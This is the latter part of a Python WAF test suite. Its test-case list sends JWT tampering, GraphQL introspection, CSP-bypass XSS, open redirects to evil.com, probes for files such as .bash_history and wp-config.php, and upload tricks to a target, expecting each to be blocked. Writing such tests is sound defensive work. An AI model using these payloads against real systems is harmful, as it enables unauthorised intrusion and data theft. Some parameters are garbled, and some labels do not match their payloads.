    ("JWT", f"{TARGET_URL}/api", "JWT (Level 7) -  Modified payload", 403, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGFtcGVyZWQifQ.signature"}, None),
   ("JWT", f"{TARGET_URL}/api", "JWT (Level 8) -  Modified header", 403, {"Authorization": "Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCJ9.signature"}, None),
    ("JWT", f"{TARGET_URL}/api", "JWT (Level 9) -  Expired JWT", 403, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImV4cCI6MTYwMDAwMDAwMCwibGF0IjoxNTE2MjM5MDIyfQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.signature"}, None),
      ("JWT", f"{TARGET_URL}/api", "JWT (Level 10) -  JWT with critical header", 403, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImNyaXQiOlsiaWF0Il19.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature"}, None),

    # GraphQL Injection
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 1) - Basic Query Injection", 403, {"Content-Type": "application/json"}, '{"query":"{ user(id:1) { username, password } }"}'),
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 2) - Injection via Variables", 403, {"Content-Type": "application/json"}, '{"query":"query getUser($id:Int){ user(id:$id){ username, password }}","variables":{"id":1}}'),
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 3) - Introspection Query", 403, {"Content-Type": "application/json"}, '{"query":"{ __schema { types { name fields { name } } } }"}'),
     ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 4) -  Introspection with args", 403, {"Content-Type": "application/json"}, '{"query":"{ __type(name: \\"User\\") { fields { name } } }"}'),
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 5) - Batch Querying", 403, {"Content-Type": "application/json"}, '[{"query":"{ user(id:1) { username } }"},{"query":"{ user(id:2) { username } }"}]'),
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 6) -  Mutation Injection", 403, {"Content-Type": "application/json"}, '{"query":"mutation { createUser(username: \\"test\\", password: \\"test\\") { id } }"}'),
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 7) -  Fragment Injection", 403, {"Content-Type": "application/json"}, '{"query":"fragment UserInfo on User { username } query getUser { user(id:1) { ...UserInfo } }"}'),
     ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 8) - Alias Injection", 403, {"Content-Type": "application/json"}, '{"query":"query getUser { user:user(id:1) { username } }"}'),
    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 9) -  Input Object Injection", 403, {"Content-Type": "application/json"}, '{"query":"mutation { updateUser(id:1, data: { username: \\"test\\", email: \\"test@example.com\\"}) { id } }"}'),
     ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 10) -  Directive Injection", 403, {"Content-Type": "application/json"}, '{"query":"query getUser { user(id:1) @include(if: true) { username } }"}'),

    ## Some missing test..
        # HTTP Verb Tampering Tests (Extended)
    ("Verb Tampering", f"{TARGET_URL}/api/items", "Verb Tampering (Level 11) - POST with PUT override param", 405, None, "X-HTTP-Method-Override=PUT&data=test"), # or 400 if body parsing fails before override
    ("Verb Tampering", f"{TARGET_URL}/api/delete_user", "Verb Tampering (Level 12) - POST instead of DELETE (admin)", 405, {"X-HTTP-Method-Override": "POST"}, None),
    ("Verb Tampering", f"{TARGET_URL}/report", "Verb Tampering (Level 13) - HEAD to download report", 405, {"X-HTTP-Method-Override": "HEAD"}, None), #  HEAD on download endpoint
    ("Verb Tampering", f"{TARGET_URL}/update_settings", "Verb Tampering (Level 14) - GET to update settings (instead of POST)", 405, {"X-HTTP-Method-Override": "GET"}, "setting1=newvalue&setting2=othervalue"),
    ("Verb Tampering", f"{TARGET_URL}/view_config", "Verb Tampering (Level 15) - PATCH to view config", 405, {"X-HTTP-Method-Override": "PATCH"}, None), # Patch for read action
    ("Verb Tampering", f"{TARGET_URL}/admin/action", "Verb Tampering (Level 16) - TRACE to admin action", 405, {"X-HTTP-Method-Override": "TRACE"}, None),
    ("Verb Tampering", f"{TARGET_URL}/api/search_data", "Verb Tampering (Level 17) - DELETE for search", 405, {"X-HTTP-Method-Override": "DELETE"}, "query=searchTerm"),
    ("Verb Tampering", f"{TARGET_URL}/login", "Verb Tampering (Level 18) - OPTIONS to login", 405, {"X-HTTP-Method-Override": "OPTIONS"}, "username=test&password=pass"),
    ("Verb Tampering", f"{TARGET_URL}/admin/backup", "Verb Tampering (Level 19) - PUT to admin backup trigger", 405, {"X-HTTP-Method-Override": "PUT"}, None), # Put instead of GET for backup trigger
    ("Verb Tampering", f"{TARGET_URL}/submit_feedback", "Verb Tampering (Level 20) - HEAD instead of POST feedback", 405, {"X-HTTP-Method-Override": "HEAD"}, "feedback=test feedback"),

    # Business Logic Attacks (Extended)
    ("Business Logic", f"{TARGET_URL}/signup", "Business Logic (Level 11) - Reusing existing username", 403, None, "username=testuser&password=newpassword"), # Assuming 'testuser' was used before
    ("Business Logic", f"{TARGET_URL}/signup", "Business Logic (Level 12) - Weak password 'password'", 403, None, "username=weakuser&password=password"),
    ("Business Logic", f"{TARGET_URL}/signup", "Business Logic (Level 13) - Username similar to admin (admin1)", 403, None, "username=admin1&password=password123"),
    ("Business Logic", f"{TARGET_URL}/login", "Business Logic (Level 14) - Login with default credentials (test:test)", 403, None, "username=test&password=test"),
    ("Business Logic", f"{TARGET_URL}/login", "Business Logic (Level 15) - Login with common password '123456'", 403, None, "username=testuser&password=123456"),
    ("Business Logic", f"{TARGET_URL}/reset_password", "Business Logic (Level 16) - Multiple password reset for same account", 403, None, "new_password=newpass_v2"), # Repeat reset after level 6 attempt
    ("Business Logic", f"{TARGET_URL}/transfer_funds", "Business Logic (Level 17) - Transfer amount exceeds limit", 403, None, "amount=1000000&to=victim"), # Large amount
    ("Business Logic", f"{TARGET_URL}/apply_discount", "Business Logic (Level 18) - Expired Discount Code", 403, None, "discount_code=EXPIRED2023"), # Assume 'EXPIRED2023' is known expired code
    ("Business Logic", f"{TARGET_URL}/change_email", "Business Logic (Level 19) - Change Email to Disposable Domain (tempmail.org)", 403, None, "new_email=test@tempmail.org"), # Disposable email domain
    ("Business Logic", f"{TARGET_URL}/create_post", "Business Logic (Level 20) - Post with too many tags", 403, None, "title=Test Post&content=content&tags=" + ",".join(["tag"]*50)), # Many tags

    # CSP Bypass (Extended - Still basic curl tests)
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 11) - Data URI script (Blocked in strict CSP)", 403, None, "<script>eval('alert(1)')</script>"), # Expect block if strict CSP, otherwise may pass with 200 if no CSP
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 12) - Unsafe-eval attempt (Blocked in strict CSP)", 403, None, "<script>setTimeout('alert(1)', 0)</script>"), # Expect block if strict CSP blocks unsafe-eval
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 13) -  WASM in object (object-src check)", 403, None, "<object data='malicious.wasm'></object>"), # Wasm object might be controlled by object-src
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 14) - Form action to data URI (form-action policy)", 403, None, "<form action='data:text/html;base64,...'><input type=submit></form>"), # Form to data URI
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 15) -  Sandboxed iframe escape attempt (If sandbox attr used, try breaking)", 403, None, "<iframe src='{TARGET_URL}' sandbox='allow-scripts allow-same-origin'><script>top.location='http://evil.com'</script></iframe>"), # Attempt to break sandbox with top.location. Expect block still by WAF if payload is recognized.  Full sandbox bypass requires browser context usually for effective testing.
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 16) -  Plugin type (plugin-types policy, e.g. application/x-shockwave-flash)", 403, None, "<embed type='application/x-shockwave-flash' src='malicious.swf'>"), #  Flash embed might be restricted via plugin-types policy.
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 17) - Frame-ancestors 'none' bypass (Try framing even if 'none')", 403, None, "<iframe src='{TARGET_URL}'></iframe>"), # Even if frame-ancestors is 'none', still try to frame - might be misconfigured. Expect block, or 403 from clickjacking protection ideally, rather than CSP purely blocking framing - CSP blocks resource load usually inside the iframe. Clickjacking is about preventing framing in first place.
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 18) -  Connect-src to evil.com (check logs if connect blocked)", 200, {"Content-Security-Policy": "default-src 'self'; connect-src http://evil.com; report-uri /csp_report"}, None), # If connect-src is set to specific domain, and we try to fetch from others, should report or ideally block (more likely report-only for initial setup). Check logs of target for violations.
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 19) -  Default-src 'self', inline script event handler (onerror etc.)", 403, None, "<img src='#' onerror='alert(1)'>"), # Default-src self should block inline event handlers unless 'unsafe-inline' or nonce/hash present for script-src.
    ("CSP Bypass", f"{TARGET_URL}/", "CSP Bypass (Level 20) -  Trusted types policy violation (If CSP with trusted-types)", 403, {"Content-Security-Policy": "require-trusted-types-for 'script'"}, "<script>document.body.innerHTML = '<p>Test</p>';</script>"), # If trusted types enforced, direct DOM manipulation with innerHTML from inline script may be blocked. This one is very dependent on target CSP policy. WAF detection based on header, or payload likely.

    # Open Redirect Tests (Extended)
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://evil.com..", "Open Redirect (Level 11) - Double Dot Pathing", 302, None, None), # Double dot in domain name
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://evil.com%20", "Open Redirect (Level 12) - Whitespace in URL", 302, None, None), # Whitespace after domain
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://evil.com/", "Open Redirect (Level 13) - Unicode domain bypass (punycode if applicable, depends on curl handling)", 302, None, None), # unicode domain representation if curl supports punycode
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://0evil.com", "Open Redirect (Level 14) - Leading Zero", 302, None, None), # Leading zero before domain
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://evil.com\\", "Open Redirect (Level 15) - Trailing Backslash", 302, None, None), # Trailing backslash
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://evil.com\t", "Open Redirect (Level 16) - Tab character", 302, None, None), # Tab char after domain
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://evil.com%00", "Open Redirect (Level 17) - Null byte injection", 302, None, None), # Null byte after domain, may truncate
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://@evil.com", "Open Redirect (Level 18) - Authority component bypass", 302, None, None), # Authority component bypass (@)
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://user:pass@evil.com", "Open Redirect (Level 19) - Credential in URL", 302, None, None), # Credential in URL, another version, more explicit
    ("Open Redirect", f"{TARGET_URL}/redirect?url=http://[::ffff:192.168.1.1]", "Open Redirect (Level 20) - IPv6 Mapped IPv4 Address", 302, None, None), # IPv6 Mapped IPv4 Address

    # Information Disclosure - Files (Extended)
    ("Info Disclosure", f"{TARGET_URL}/.DS_Store", "Info Disclosure (Level 11) - .DS_Store macOS files", 403, None, None), # macOS metadata file
    ("Info Disclosure", f"{TARGET_URL}/WEB-INF/jboss-web.xml", "Info Disclosure (Level 12) - JBoss web config", 403, None, None), # JBoss config file
    ("Info Disclosure", f"{TARGET_URL}/Tomcat/conf/server.xml", "Info Disclosure (Level 13) - Tomcat server config", 403, None, None), # Tomcat config
    ("Info Disclosure", f"{TARGET_URL}/dump.rdb", "Info Disclosure (Level 14) - Redis DB dump", 403, None, None), # Redis dump file
    ("Info Disclosure", f"{TARGET_URL}/.bash_history", "Info Disclosure (Level 15) - Bash History", 403, None, None), # Shell history
    ("Info Disclosure", f"{TARGET_URL}/htdocs/WEB-INF/web.xml", "Info Disclosure (Level 16) - Alternate WEB-INF path", 403, None, None), # Alternative WEB-INF
    ("Info Disclosure", f"{TARGET_URL}/wp-config.php", "Info Disclosure (Level 17) - WordPress config", 403, None, None), # WP config file
    ("Info Disclosure", f"{TARGET_URL}/sites/default/settings.php", "Info Disclosure (Level 18) - Drupal settings", 403, None, None), # Drupal config
    ("Info Disclosure", f"{TARGET_URL}/configuration.php", "Info Disclosure (Level 19) - Joomla config", 403, None, None), # Joomla config
    ("Info Disclosure", f"{TARGET_URL}/BACKUP_config.php", "Info Disclosure (Level 20) - Backup config file name", 403, None, None), # Backup config filename

    # Client-Side/HTML Injection (Basic, server response focused still)
    ("HTML Injection", f"{TARGET_URL}/?param=<b>test</b>", "HTML Injection (Level 1) - Bold Tag", 403, None, None), # Basic HTML tag in parameter
    ("HTML Injection", f"{TARGET_URL}/?param=<p>Paragraph</p>", "HTML Injection (Level 2) - Paragraph Tag", 403, None, None), # Paragraph
    ("HTML Injection", f"{TARGET_URL}/?param=<h1>Header</h1>", "HTML Injection (Level 3) - Header Tag", 403, None, None), # Header
    ("HTML Injection", f"{TARGET_URL}/?param=<hr>", "HTML Injection (Level 4) - Horizontal Rule", 403, None, None), # HR
    ("HTML Injection", f"{TARGET_URL}/?param=<br>", "HTML Injection (Level 5) - Line Break", 403, None, None), # BR
    ("HTML Injection", f"{TARGET_URL}/?param=<ul><li>Item</li></ul>", "HTML Injection (Level 6) - Unordered List", 403, None, None), # UL/LI list
    ("HTML Injection", f"{TARGET_URL}/?param=<ol><li>Item</li></ol>", "HTML Injection (Level 7) - Ordered List", 403, None, None), # OL/LI list
    ("HTML Injection", f"{TARGET_URL}/?param=<table border=1><tr><td>Cell</td></tr></table>", "HTML Injection (Level 8) - Table", 403, None, None), # Table
    ("HTML Injection", f"{TARGET_URL}/?param=<div><span>Span</span></div>", "HTML Injection (Level 10) - Div and Span", 403, None, None), # Div/Span

    # Parameter Pollution Tests
    ("Parameter Pollution", f"{TARGET_URL}/search?q=value1&q=value2", "Param Pollution (Level 1) - Duplicate Parameter", 403, None, None), # Simple dup param
    ("Parameter Pollution", f"{TARGET_URL}/search?q=value1;value2", "Param Pollution (Level 2) - Separator Pollution (;)", 403, None, None), # Separator-based
    ("Parameter Pollution", f"{TARGET_URL}/search?q=value1,value2", "Param Pollution (Level 3) - Separator Pollution (,)", 403, None, None), # comma separator
    ("Parameter Pollution", f"{TARGET_URL}/search?q[]=value1&q[]=value2", "Param Pollution (Level 4) - Array Notation", 403, None, None), # Array [] notation
    ("Parameter Pollution", f"{TARGET_URL}/search?q[0]=value1&q[1]=value2", "Param Pollution (Level 5) - Indexed Array", 403, None, None), # Indexed array notation
    ("Parameter Pollution", f"{TARGET_URL}/search?param1=val1¶m1=sqli'--", "Param Pollution (Level 6) - Polluted with SQLi", 403, None, None), # SQLi in polluted param
    ("Parameter Pollution", f"{TARGET_URL}/search?param2=val2¶m2=<script>alert</script>", "Param Pollution (Level 7) - Polluted with XSS", 403, None, None), # XSS
    ("Parameter Pollution", f"{TARGET_URL}/api/process", "Param Pollution (Level 8) - POST body pollution - same key twice", 403, None, "data=value1&data=value2"), # POST body pollution
    ("Parameter Pollution", f"{TARGET_URL}/api/config", "Param Pollution (Level 9) - Header param pollution (custom header)", 403, {"X-Custom-Param": "value1,value2"}, None), # Header pollution via custom header
    ("Parameter Pollution", f"{TARGET_URL}/filter", "Param Pollution (Level 10) - URL encoded dup param", 403, None, "q=test1&q%3Dtest2"), # URL encoded dup param in URL

    # File Upload (Extended Extensions/Types)
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 16) - .pht double extension", 403, None, "FAKE_PHP_CONTENT"), # pht double extension variant
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 17) - PHp7 extension", 403, None, "FAKE_PHP_CONTENT"), # PHP7 extension
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 18) - .phar PHP archive", 403, None, "FAKE_PHAR_CONTENT"), # PHAR archive, if processed as PHP in some configs
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 19) - .inc include file for PHP", 403, None, "FAKE_PHP_CONTENT"), # .inc include file
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 20) -  Text file with MIME type application/x-php", 403, {"Content-Type": "application/x-php"}, "FAKE_TEXT_CONTENT"), # MIME type override attempt
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 21) - Image file with MIME type text/html", 403, {"Content-Type": "text/html"}, "FAKE_IMAGE_CONTENT"), # MIME type text/html for image - content type spoofing for HTML/script injection.
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 22) - .config file type", 403, None, "FAKE_CONFIG_CONTENT"), # Generic config type, if target tries to parse configs directly from uploads, potential info leak/DoS
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 23) -  Large file upload (DoS test - expect block or timeout)", 403, None, "LARGE_FILE_CONTENT"), # Placeholder for large content for DoS - will require creating large file content if real DoS test needed. Expect 403 or timeout if WAF blocks based on size, otherwise could pass if server crashes from size.  WAF might block large uploads at network level too.
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 24) -  Zip bomb (Denial of Service via decompression)", 403, None, "ZIP_BOMB_CONTENT"), # Placeholder for zip bomb - again, needs generating actual zip bomb for real test. WAF may detect zip bombs based on compression ratios/characteristics, expect block or timeout.
    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 25) -  .jspx - JSP XML file type", 403, None, "FAKE_JSPX_CONTENT"), # .jspx variant for JSP

    # Valid Requests
    ("Valid", f"{TARGET_URL}/", "Valid (Level 1) - Homepage", 200, None, None)
    
]


def main():
    parser = argparse.ArgumentParser(description="WAF Security Test Suite")
    parser.add_argument("--user-agent", "-ua", type=str, default=DEFAULT_USER_AGENT,
                        help="Set a custom User-Agent string")

    args = parser.parse_args()
    custom_user_agent = args.user_agent
    
    with open(OUTPUT_FILE, "w") as f:
        f.write("")  # Clear previous results

    print(f"{BLUE}WAF Security Test Suite{NC}")
    print(f"{BLUE}Target: {NC}{TARGET_URL}")
    print(f"{BLUE}Date: {NC}{datetime.datetime.now()}")
    print("----------------------------------------")

    total_tests = len(test_cases)
    passed = 0
    failed = 0

    for category, url, description, expected_code, headers, body in test_cases:
        if test_url(url, description, expected_code, headers, body, custom_user_agent):
            passed += 1
        else:
            failed += 1

    print("----------------------------------------")
    print(f"{BLUE}Results Summary{NC}")
    print(f"Total Tests: {total_tests}")
    print(f"{GREEN}Passed: {NC}{passed}")
    print(f"{RED}Failed: {NC}{failed}")

    if failed > 0:
        print(f"{RED}WAF Test Suite Failed: Please review {OUTPUT_FILE} for more details.{NC}")
    else:
        print(f"{GREEN}WAF Test Suite Passed! All checks are successful.{NC}")


if __name__ == "__main__":
    main()
